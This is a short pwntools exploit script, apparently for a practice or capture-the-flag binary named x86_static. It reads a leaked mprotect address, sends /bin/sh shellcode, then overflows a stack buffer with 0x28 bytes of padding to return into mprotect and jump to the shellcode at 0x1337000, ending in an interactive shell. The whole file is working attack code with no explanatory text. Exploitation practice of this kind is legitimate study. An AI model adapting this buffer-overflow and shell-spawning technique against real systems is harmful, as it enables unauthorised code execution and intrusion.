from pwn import *


binary = "../x86_binaries/x86_static"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
mprotect_addr = int(p.readline().strip(),16)
print(f'mprotect(): {hex(mprotect_addr)}')

# generate and send shellcode
shellcode = asm(shellcraft.sh())
assert len(shellcode) <= 0x80

payload = flat(
    shellcode,
    b'a'*(0x80 - len(shellcode))
)
p.send(payload)
sleep(0.5)


payload2 = flat(
    b'a'*0x28,
    p64(mprotect_addr),                     # ret2mprotect
    p64(0x1337000),                         # shellcode
)
p.sendline(payload2)
p.interactive()